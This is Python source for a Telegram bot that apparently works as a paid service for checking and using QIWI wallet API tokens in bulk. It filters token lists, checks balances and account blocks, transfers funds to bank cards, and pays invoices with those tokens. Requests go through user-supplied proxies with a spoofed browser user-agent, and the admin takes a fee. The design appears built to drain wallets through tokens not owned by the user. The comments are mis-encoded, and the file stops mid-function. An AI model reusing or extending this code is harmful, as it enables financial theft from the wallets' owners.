# -*- coding: utf-8 -*-
import time
import pickle
import json
import random as rd
import os
from itertools import cycle

import requests
import telebot
from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from bs4 import BeautifulSoup

from secured_config import TG_TOKEN
import secured_config
from config import ABOUT_BOT, CONNECTION_TIMEOUT
import config
import myhelper
from qiwi_codes import ERROR_CODES, INVOICE_CODES, PAYMENT_CODES


def load_freezed_tokens(token):
    try:
        with open('freezing_tokens.json', 'r', encoding='utf-8') as f:
            freezed_tokens = json.load(f)
        if isinstance(freezed_tokens, dict) and freezed_tokens.get(token):
            return float(freezed_tokens[token]["sum"])
    except:
        pass
    else:
        return


def check_paid(user_codes):
    def get_history():
        try:
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + str(secured_config.QIWI_TOKEN)
            parameters = {'rows': str('50'), 'operation': "IN", "sources": "QW_RUB"}
            history = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + str(secured_config.ADMIN_QIWI) + '/payments', params = parameters, timeout=CONNECTION_TIMEOUT).json()["data"]
            if history and isinstance(history, list):
                return history
            else:
                raise ValueError
        except:
            pass

    history = get_history()
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –æ–ø–ª–∞—Ç–∞.
    for one_payment in history:
        # –ü–æ–ª—É—á–∞–µ–º –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π.
        comment = one_payment.get("comment")
        if one_payment["status"] == "SUCCESS" and comment and isinstance(comment, str) and len(comment) > 4 and ':' in comment:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ —Ç–∞–∫–æ–π –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π.
            for waiting_payment in user_codes:
                waiting_comment = waiting_payment["comment"]
                waiting_sum = waiting_payment["sum"]
                waiting_upgrade = waiting_payment["upgrade"]
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å—É–º–º—É –∏ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π.
                if one_payment["sum"]["amount"] == waiting_sum and comment == waiting_comment:
                    return {
                        "id": one_payment["txnId"],
                        "sum": one_payment["sum"]["amount"],
                        "from": one_payment["account"],
                        "upgrade": waiting_upgrade,
                        "comment": comment
                    }


def gen_code(transactions=False, lenght=4):
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    while True:
        result = ''
        for i in range(lenght):
            result += rd.choice(chars)
        if not transactions or not result in [x["comment"].split(':')[1] for x in transactions if isinstance(x["comment"], str)]:
            return result


def parce_start(text):
    try:
        if len(text) == 6:
            default_start = True
            from_comment = False
        else:
            default_start = False
            from_comment = text[7:]
        return {"default": default_start, "from": from_comment}
    except:
        result = {"default": True, "from": False}


def send_referal(tg_id):
    try:
        ib_referal = InlineKeyboardMarkup()
        ib_referal.add(InlineKeyboardButton(text='–ö—É–ø–∏—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É', url=config.URL_REFERAL))
        referal_text = '–ü–æ–∫–∞ —ç—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –º–æ–∂–µ—Ç–µ –∫—É–ø–∏—Ç—å –∫—Ä–∏–ø—Ç—É –≤ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–º –±–æ—Ç–µ —É –Ω–∞—à–∏—Ö –ø–∞—Ä—Ç–Ω–µ—Ä–æ–≤, –∞ –æ–ø–ª–∞—Ç–∏—Ç—å —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª–∞ –º–æ–µ–≥–æ –±–æ—Ç–∞.'
        bot.send_message(tg_id, referal_text, parse_mode='markdown', reply_markup=ib_referal)
    except:
        pass
    else:
        return True


def filt_tokens(tokens):
    # –ü–æ–ª—É—á–∞–µ—Ç –∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç —Å–ø–∏—Å–æ–∫ —Ç–æ–∫–µ–Ω–æ–≤.
    norm_chars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    try:
        true_tokens = []
        for one_token in tokens:
            if len(one_token) == 32:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—É—é –±—É–∫–≤—É —Ç–æ–∫–µ–Ω–∞.
                for one_char in one_token:
                    # –ï—Å–ª–∏ —Ö–æ—Ç—è –±—ã –æ–¥–Ω–∞ –±—É–∫–≤—É –Ω–µ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É–µ—Ç –Ω–æ—Ä–º–∞–º.
                    if not one_char in norm_chars:
                        break
                else:
                    true_tokens.append(one_token)
    except:
        return []
    else:
        return true_tokens

CORE = 1627706552


def info_loader(func):
    def wrapper(*args, **kwargs):
        func(*args, **kwargs)
        qiwi.save_users_info()
        qiwi.save_balances()
    return wrapper


def get_ip_info(proxy_ip):
    try:
        page_info = requests.get(f'http://ip-api.com/json/{proxy_ip}').json()
        if page_info["status"] == "success":
            return {
                "regionName": page_info["regionName"],
                "country": page_info["country"],
                "city": page_info["city"],
                "timezone": page_info["timezone"],
                "query": page_info["query"]
            }
        else:
            raise ValueError
    except:
        pass


def get_proxy_dict(user_proxy):
    try:
        if user_proxy:
            ip = user_proxy["ip"]
            port = user_proxy["port"]
            login = user_proxy["login"]
            password = user_proxy["password"]

            if login and password:
                string_proxy = {
                    "http": f"http://{login}:{password}@{ip}:{port}",
                    "https": f"https://{login}:{password}@{ip}:{port}"
                }
            else:
                string_proxy = {
                    "http": f"http://{ip}:{port}",
                    "https": f"https://{ip}:{port}"
                }
            return string_proxy
    except:
        pass


def get_proxy(tg_id):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø—Ä–æ–∫—Å–∏.
        if qiwi.users_proxy.get(tg_id, {}).get("work"):
            is_working = True
            # –ü–æ–ª—É—á–∞–µ–º –ø—Ä–æ–∫—Å–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
            user_proxy = qiwi.users_proxy.get(tg_id, {}).get("data")
            # –ü–æ–ª—É—á–∞–µ–º –Ω–∞—à IP.
            now_ip = get_ip()
            # –ü–æ–ª—É—á–∞–µ–º IP —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏.
            proxy_ip = get_ip(user_proxy)
            # –ü–æ–ª—É—á–∞–µ–º –≥–æ—Ç–æ–≤–æ–µ —Ä–µ—à–µ–Ω–∏–µ.
            string_proxy = get_proxy_dict(user_proxy)
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º.
            if not (now_ip and proxy_ip and now_ip != proxy_ip and string_proxy):
                raise ValueError
        else:
            is_working = False
            string_proxy = {}
    except:
        return {
            "status": False
        }
    else:
        return {
            "status": True,
            "work": is_working,
            "dict": string_proxy
        }


def get_ip(user_proxy=False):
    try:
        if user_proxy:
            ip = user_proxy["ip"]
            port = user_proxy["port"]
            login = user_proxy["login"]
            password = user_proxy["password"]

            if login and password:
                string_proxy = {
                    "http": f"http://{login}:{password}@{ip}:{port}",
                    "https": f"https://{login}:{password}@{ip}:{port}"
                }
            else:
                string_proxy = {
                    "http": f"http://{ip}:{port}",
                    "https": f"https://{ip}:{port}"
                }
            ip = requests.get('http://checkip.dyndns.org', proxies=string_proxy, timeout=CONNECTION_TIMEOUT).content
        else:
            ip = requests.get('http://checkip.dyndns.org', timeout=CONNECTION_TIMEOUT).content
        return BeautifulSoup(ip, 'html.parser').find('body').text.split()[-1]
    except:
        pass


def form_proxy(raw_proxy):
    try:
        if not ':' in raw_proxy or len(raw_proxy) < 7:
            raise ValueError
        if '@' in raw_proxy:
            first_part, second_part = raw_proxy.split('@')
            mb_ip, mb_port = first_part.split(":")
            if mb_ip.count('.') == 3:
                ip = mb_ip
                port = mb_port
                login, password = second_part.split(':')
            else:
                ip, port = second_part.split(':')
                login = mb_ip
                password = mb_port
        else:
            login = None
            password = None
            ip, port = raw_proxy.split(':')
        if not (ip and port):
            raise ValueError
    except:
        return
    else:
        return {
            "ip": ip,
            "port": port,
            "login": login,
            "password": password
        }


def do_have_proxy(tg_id):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø—Ä–æ–∫—Å–∏ –∏
        # –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –æ–Ω–∏.
        return qiwi.users_proxy[tg_id]["work"]
    except:
        pass


def get_clock():
    clocks = ['üïë', 'üïí', 'üïî', 'üïï', 'üïñ', 'üïó', 'üïò', 'üïô']
    for clock in cycle(clocks):
        yield clock


def get_sand_clock():
    for sand_clock in cycle(['‚è≥', '‚åõ']):
        yield sand_clock


def form_invoice(raw_invoice):
    invoice = raw_invoice.split('invoice')[1].split('=')[1].split('&')[0] if 'invoice' in raw_invoice else raw_invoice
    return invoice if len(invoice) > 10 else False


def send_card(now_token, payment_data, tg_id):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                do_proxy = False
        else:
            raise ValueError

        s = requests.Session()
        s.headers['Accept'] = 'application/json'
        s.headers['Content-Type'] = 'application/json'
        s.headers['authorization'] = 'Bearer ' + now_token
        postjson = {"id":"","sum": {"amount":"","currency":"643"},"paymentMethod": {"type":"Account","accountId":"643"},"fields": {"account":""}}
        postjson['id'] = str(int(time.time() * 1000))
        postjson['sum']['amount'] = payment_data.get('sum')
        postjson['fields']['account'] = payment_data.get('to_card')
        prv_id = payment_data.get('prv_id')
        if payment_data.get('prv_id') in ['1960', '21012']:
            postjson['fields']['rem_name'] = payment_data.get('rem_name')
            postjson['fields']['rem_name_f'] = payment_data.get('rem_name_f')
            postjson['fields']['reg_name'] = payment_data.get('reg_name')
            postjson['fields']['reg_name_f'] = payment_data.get('reg_name_f')
            postjson['fields']['rec_city'] = payment_data.get('rec_address')
            postjson['fields']['rec_address'] = payment_data.get('rec_address')

        if do_proxy:
            res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, timeout=CONNECTION_TIMEOUT, proxies=local_proxies).json()
        else:
            res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/' + prv_id + '/payments', json = postjson, timeout=CONNECTION_TIMEOUT).json()
        if res["transaction"]["state"]["code"] == "Accepted":
            return {"id": res["transaction"]["id"]}
        else:
            raise ValueError
    except:
        pass


def card_system(card_number):
    try:
        s = requests.Session()
        res = s.post('https://qiwi.com/card/detect.action', data = {'cardNumber': str(card_number) }, timeout=CONNECTION_TIMEOUT)
        provider_id = str(int(res.json()['message']))

        if provider_id in ["1963", "21013", "31652", "22351"]:
            return provider_id
        elif provider_id in ["1960", "21012"]:
            return True
    except:
        pass


def get_payment_data(now_token, now_phone, card_number, pay_sum):
    try:
        # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –∫–∞—Ä—Ç–µ.
        provider_id = card_system(card_number)

        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∫–∞–∫–∏–µ –¥–∞–Ω–Ω—ã–µ –Ω—É–∂–Ω—ã.
        if provider_id in ["1963", "21013", "31652", "22351"]:
            # –õ–µ–≥–∫–∏–µ –∫–∞—Ä—Ç—ã.
            # –°–æ–∑–¥–∞–µ–º —Å–ª–æ–≤–∞—Ä—å –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞.
            payment_data = {
                "sum": str(pay_sum),
                "to_card": str(card_number),
                "prv_id": provider_id
            }
        elif provider_id in ["1960", "21012"]:
            # –°–ª–æ–∂–Ω—ã–µ –∫–∞—Ä—Ç—ã - –ø–æ–∫–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞—é—Ç.
            raise TypeError
        else:
            raise TypeError

        return payment_data
    except:
        pass


def cancel_invoice(now_token, invoice_uid, tg_id):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                do_proxy = False
        else:
            raise ValueError

        s = requests.Session()
        s.headers['Authorization'] = 'Bearer ' + now_token
        s.headers['Accept'] = 'application/json'
        s.headers['Content-Type'] = 'application/json'
        postjson = {"id": str(invoice_uid)}
        s.headers['User-Agent'] = 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010725 Netscape6/6.1'
        if do_proxy:
            res = s.post('https://edge.qiwi.com/checkout-api/api/bill/reject', json = postjson, timeout=CONNECTION_TIMEOUT, proxies=local_proxies)
        else:
            res = s.post('https://edge.qiwi.com/checkout-api/api/bill/reject', json = postjson, timeout=CONNECTION_TIMEOUT)
        if res.status_code == 204 or res.status_code == 200:
            return True
    except:
        pass
    else:
        return True


def pay_invoice(now_token, invoice_uid, tg_id):
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
        proxy_result = get_proxy(tg_id)
        if proxy_result and proxy_result["status"]:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
            if proxy_result["work"]:
                local_proxies = proxy_result["dict"]
                do_proxy = True
            else:
                do_proxy = False
        else:
            raise ValueError
        s = requests.Session()
        s.headers['authorization'] = 'Bearer ' + now_token
        s.headers['Accept'] = 'application/json'
        s.headers['Content-Type'] = 'application/json'
        postjson = {"invoice_uid": str(invoice_uid),"currency": "643"}
        s.headers['User-Agent'] = 'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010725 Netscape6/6.1'
        if do_proxy:
            res = s.post('https://edge.qiwi.com/checkout-api/invoice/pay/wallet',json = postjson, timeout=CONNECTION_TIMEOUT, proxies=local_proxies)
        else:
            res = s.post('https://edge.qiwi.com/checkout-api/invoice/pay/wallet',json = postjson, timeout=CONNECTION_TIMEOUT)
        if res.status_code == 200 and (res.json()["invoice_status"] == "PAYING_STATUS" or res.json()["invoice_status"] == "PAID_STATUS"):
            return True
    except:
        pass


def get_invoice_info(invoice_uid):
    try:
        info_url = f'http://edge.qiwi.com/checkout-api/invoice?invoice_uid={invoice_uid}'
        invoice_info = requests.get(info_url).json()
        # –°—Ç–∞—Ç—É—Å –ø–ª–∞—Ç–µ–∂.
        invoice_status = invoice_info["invoice_status"]
        # –ò–º—è –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞.
        provider_name = invoice_info["provider_name"]
        # –°–ú–° –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ.
        is_sms_confirm = invoice_info["is_sms_confirm"]
        # –í–∞–ª—é—Ç–∞.
        currency = invoice_info["currency"]
        # –°—É–º–º–∞.
        rub_sum = invoice_info["amount"]
        # –ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π.
        comment = invoice_info["comment"]

        return {
            "status": invoice_status,
            "title": provider_name,
            "sms": is_sms_confirm,
            "currency": currency,
            "sum": rub_sum,
            "comment": comment
        }
    except:
        pass


def get_receivers(only_nick=False, only_id=False):
    try:
        with open('users.pkl', 'rb') as f:
            users = pickle.load(f)
        if not (users and isinstance(users, dict)):
            raise ValueError
        if not only_nick and not only_id:
            receivers = [{"id": int(one_id), "nick": ("@" + users[one_id]["username"] if users[one_id]["username"] else "null")} for one_id in users]
        elif only_nick:
            receivers = [{"id": int(one_id), "nick": ("@" + users[one_id]["username"] if users[one_id]["username"] else "null")} for one_id in users if users[one_id]["username"] == only_nick]
        elif only_id:
            receivers = [{"id": int(one_id), "nick": ("@" + users[one_id]["username"] if users[one_id]["username"] else "null")} for one_id in users if int(only_id) == int(one_id)]
        return receivers
    except:
        pass


def bue_numb(number):
    if number or isinstance(number, int) or isinstance(number, float):
        str_number = str(number)
        if len(str_number) > 3:
            str_number, *extra_numbers = str_number.split('.')
            new_number = ''
            len_word = len(str_number)
            for n, one_char in enumerate(str_number[::-1]):
                new_number += one_char + ('' if n + 1 == len_word or (n + 1) % 3 else "'")
            return new_number[::-1] + ('.' + extra_numbers[0] if extra_numbers else '')
        return str(number)
    return "None"


def get_activity():
    try:
        with open('history.pkl', 'rb') as f:
            users_history = pickle.load(f)
    except:
        pass
    else:
        try:
            # –ü—Ä–æ–≤–µ—Ä–∫–∏.
            users_checks = users_history.get("tokens", [])
            # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–æ–≤–µ—Ä–æ–∫.
            count_checks = len(users_checks)
            # –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã.
            unique_tokens = set('')
            # –°—É–º–º–∞ –ø—Ä–æ–≤–µ—Ä–æ–∫.
            sum_checks = 0
            for one_check in users_checks:
                unique_tokens.add(one_check.get('token', ''))
                sum_checks += one_check.get("balance", 0)
            # –ü–µ—Ä–µ–≤–æ–¥—ã.
            users_transactions = users_history.get("transactions", [])
            # –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–µ—Ä–µ–≤–æ–¥–æ–≤.
            count_transactions = len(users_transactions)
            # –°—É–º–º–∞ –ø–µ—Ä–µ–≤–æ–¥–æ–≤.
            sum_transactions = 0
            for one_trans in users_transactions:
                if one_trans.get("boss_sum"):
                    sum_transactions += one_trans.get("boss_sum") * 1.02
                sum_transactions += one_trans.get("user_sum") * 1.02

        except:
            count_checks = 0
            sum_checks = 0
            count_transactions = 0
            sum_transactions = 0
            unique_tokens = set()

        return {
            "tokens": {
                "count": len(unique_tokens)
            },
            "checks": {
                "count": count_checks,
                "sum": round(sum_checks, 2)
            },
            "transactions": {
                "count": count_transactions,
                "sum": round(sum_transactions, 2)
            }
        }


def save_last_ph(last_phones):
    if last_phones:
        try:
            with open('last_phones.pkl', 'wb') as f:
                pickle.dump(last_phones, f)
        except:
            pass
        else:
            return True


def load_last_ph():
    try:
        with open('last_phones.pkl', 'rb') as f:
            last_phones = pickle.load(f)
        if not isinstance(last_phones, dict):
            raise ValueError
    except:
        last_phones = {}
    return last_phones


def save_last_t(last_tokens):
    if last_tokens:
        try:
            with open('last_tokens.pkl', 'wb') as f:
                pickle.dump(last_tokens, f)
        except:
            pass
        else:
            return True


def load_last_t():
    try:
        with open('last_tokens.pkl', 'rb') as f:
            last_tokens = pickle.load(f)
        if not isinstance(last_tokens, dict):
            raise ValueError
    except:
        last_tokens = {}
    return last_tokens


def save_user(uid, username, source=False):
    try:
        with open('users.pkl', 'rb') as f:
            users = pickle.load(f)
    except:
        users = {}
    if not users.get(uid):
        users[uid] = {
            "username": username,
            "source": source,
            "time": int(time.time())
        }
        try:
            with open('users.pkl', 'wb') as f:
                pickle.dump(users, f)
        except:
            pass
        else:
            return True


def get_user_count():
    try:
        with open('users.pkl', 'rb') as f:
            users = pickle.load(f)
        with open('history.pkl', 'rb') as f:
            history = pickle.load(f)
            uniq_tokens = set([x["telegram_id"] for x in history["tokens"]])
            uniq_users = set([x["telegram_id"] for x in history["transactions"]])
        return len(users), len(uniq_tokens), len(uniq_users)
    except:
        return False, False


def load_blacklist(premium=False):
    file_n = 'premium_users.pkl' if premium else 'blacklist.pkl'
    try:
        with open(file_n, 'rb') as f:
            blacklist = pickle.load(f)
        if not isinstance(blacklist, list):
            raise ValueError
    except:
        blacklist = []
    return blacklist


def add_blacklist(user_id, premium=False):
    file_n = 'premium_users.pkl' if premium else 'blacklist.pkl'
    try:
        with open(file_n, 'rb') as f:
            blacklist = pickle.load(f)
        if not isinstance(blacklist, list):
            raise ValueError
    except:
        blacklist = []
    if not user_id in blacklist:
        blacklist.append(user_id)
    try:
        with open(file_n, 'wb') as f:
            pickle.dump(blacklist, f)
    except:
        pass
    else:
        return True


def remove_blacklist(user_id, premium=False):
    file_n = 'premium_users.pkl' if premium else 'blacklist.pkl'
    try:
        with open(file_n, 'rb') as f:
            blacklist = pickle.load(f)
        if not isinstance(blacklist, list):
            raise ValueError
    except:
        blacklist = []
    if user_id in blacklist:
        blacklist.remove(user_id)
    try:
        with open(file_n, 'wb') as f:
            pickle.dump(blacklist, f)
    except:
        pass
    else:
        return True


def get_block_info(now_login, now_token, tg_id):
    def get_profile(now_token):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∫—É –ø—Ä–æ—Ñ–∏–ª—è."""
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s7 = requests.Session()
            s7.headers['Accept'] = 'application/json'
            s7.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true', timeout=CONNECTION_TIMEOUT)
            is_blocked = p.json()['contractInfo']['blocked']
        except:
            pass
        else:
            return is_blocked


    def check_block(now_login, now_token):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç —Å–ø–∏—Å–æ–∫ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫."""
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ–∫—Å–∏.
            proxy_result = get_proxy(tg_id)
            if proxy_result and proxy_result["status"]:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∫–ª—é—á–µ–Ω—ã –ª–∏ –ø—Ä–æ–∫—Å–∏.
                if proxy_result["work"]:
                    local_proxies = proxy_result["dict"]
                    do_proxy = True
                else:
                    do_proxy = False
            else:
                raise ValueError
            s7 = requests.Session()
            s7.headers['Accept']= 'application/json'
            s7.headers['authorization'] = 'Bearer ' + now_token
            if do_proxy:
                blocks = s7.get('https://edge.qiwi.com/person-profile/v1/persons/' + str(now_login) + '/status/restrictions', proxies=local_proxies, timeout=CONNECTION_TIMEOUT)
            else:
                blocks = s7.get('https://edge.qiwi.com/person-profile/v1/persons/' + str(now_login) + '/status/restrictions', timeout=CONNECTION_TIMEOUT)
            if not blocks.status_code:
                return ValueError
        except:
            pass
        else:
            try:
                result = []
                for one_block in blocks.json():
                    result.append(f"–ö–æ–¥: {one_block['restrictionCode']}\n–û–ø–∏—Å–∞–Ω–∏–µ: {one_block['restrictionDescription']}")
                if result:
                    result = 'üö´ –¢–µ–∫—É—â–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:\n' + '\n-----------\n'.join(result)
            except:
                pass
            else:
                return result


    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ—à–µ–ª–µ–∫ –Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫—É.
    profile_res = get_profile(now_token)
    if profile_res is None:
        # –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ.
        return 'cannot_info'
    elif profile_res:
        # –ö–æ—à–µ–ª–µ–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω.
        return 'profile_blocked'

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏.
    return check_block(now_login=now_login, now_token=now_token)


class TransactionTypes():
    def __init__(self):
        self.phone = 'to_phone_balance'
        self.qiwi = 'to_qiwi'
        self.invoice_out = 'invoice_out'
        self.invoice_in = 'invoice_in'


class SimpleQIWI:
    def __init__(self):
        self.tg_admins = []
        self.users_info = {}
        self.notification = None
        self.notif_checks = False
        self.notif_transactions = False
        self.notif_new = False
        self.user_count = {"last": 0, "count": 0, "new_act_tokens": 0, "new_act_trans": 0}
        self.activity = {"last": 0, "info": {}}
        self.last_tokens = load_last_t()
        self.last_phones = load_last_ph()
        self.users_proxy = {}
        self.users_balance = {}

    def get_user_limits(self, tid):
        try:
            user_have = qiwi.users_balance.get(tid, {}).get("have", 0)
            user_spent = qiwi.users_balance.get(tid, {}).get("spent", 0)
            user_free = config.FREE_RUBLES
        except:
            user_have = 0
            user_spent = 0
            user_free = config.FREE_RUBLES
        # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é –µ—â–µ –º–æ–∂–µ—Ç –ø–µ—Ä–µ–≤–æ–¥–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.
        user_left = user_have + user_free - user_spent
        return {
            "have": user_have,
            "spent": user_spent,
            "free": user_free,
            "left": user_left
        }

    def add_spent_limits(self, tid, spent_sum):
        try:
            if not isinstance(qiwi.users_balance.get(tid, {}).get("spent"), float) and not isinstance(qiwi.users_balance.get(tid, {}).get("spent"), int):
                self.users_balance[tid] = {
                    "have": 0,
                    "spent": 0,
                    "free": 0,
                    "transactions": []
                }
            qiwi.users_balance[tid]["spent"] += round(spent_sum, 2)
        except Exception as e:
            print(f'Add spent limits error [{tid} -> {spent_sum}]: {e}')

    def check_user_limits(self, tid, try_sum):
        try:
            user_have = qiwi.users_balance.get(tid, {}).get("have", 0)
            user_spent = qiwi.users_balance.get(tid, {}).get("spent", 0)
            user_free = config.FREE_RUBLES
            # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É, –∫–æ—Ç–æ—Ä—É—é –µ—â–µ –º–æ–∂–µ—Ç –ø–µ—Ä–µ–≤–æ–¥–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.
            user_left = user_have + user_free - user_spent
            return try_sum <= user_left
        except:
            pass

    def admin_upgrade_limit(self, tid, adding_sum):
        try:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –∑–∞–ø–∏—Å—å —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
            if not (self.users_balance.get(tid) and not self.users_balance.get(tid, {}).get("transactions") is None):
                self.users_balance[tid] = {
                    "have": 0,
                    "spent": 0,
                    "free": 0,
                    "transactions": []
                }
            # –î–æ–±–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é.
            self.users_balance[tid]["transactions"].append({
                "create_time": int(time.time()),
                "paid_time": int(time.time()),
                "from": "admin",
                "status": "added",
                "comment": False,
                "sum": 0,
                "upgrade": adding_sum
            })
            self.users_balance[tid]["have"] += adding_sum
        except:
            pass
        else:
            return True

    def upgrade_limit(self, tid, adding_sum, comment, from_user):
        for one_book in self.users_balance[tid]["transactions"]:
            if one_book["comment"] == comment:
                one_book["status"] = "paid"
                one_book["paid_time"] = int(time.time())
                one_book["from"] = from_user
                self.users_balance[tid]["have"] += adding_sum
                return True

    def gen_transaction(self, tid, comment, deposit_sum, total_upgrade):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –∑–∞–ø–∏—Å—å —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.
        if not (self.users_balance.get(tid) and not self.users_balance.get(tid, {}).get("transactions") is None):
            self.users_balance[tid] = {
                "have": 0,
                "spent": 0,
                "free": 0,
                "transactions": []
            }
        # –î–æ–±–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é.
        self.users_balance[tid]["transactions"].append({
            "create_time": int(time.time()),
            "status": "created",
            "comment": comment,
            "sum": deposit_sum,
            "upgrade": total_upgrade
        })

    def reset(self, tg_id):
        try:
            if not self.users_info.get(tg_id):
                self.users_info[tg_id] = {}
            self.users_info[tg_id]["status"] = None
        except:
            pass

    def status(self, tid, new_status):
        if not self.users_info.get(tid):
            self.users_info[tid] = {}
        self.users_info[tid]["status"] = new_status

    def save_balances(self):
        try:
            with open('balances.pkl', 'wb') as f:
                pickle.dump(self.users_balance, f)
        except:
            pass
        else:
            return True

    def load_balances(self):
        try:
            with open('balances.pkl', 'rb') as f:
                loaded_balances = pickle.load(f)
            if not loaded_balances:
                raise ValueError
        except:
            loaded_balances = {}
        self.users_balance = loaded_balances
        return True

    def save_proxy(self):
        try:
            with open('proxies.pkl', 'wb') as f:
                pickle.dump(self.users_proxy, f)
        except:
            pass
        else:
            return True

    def load_proxy(self):
        try:
            with open('proxies.pkl', 'rb') as f:
                loaded_proxy = pickle.load(f)
        except:
            loaded_proxy = {}
        self.users_proxy = loaded_proxy
        return True

    def save_users_info(self):
        try:
            with open('user_info.pkl', 'wb') as f:
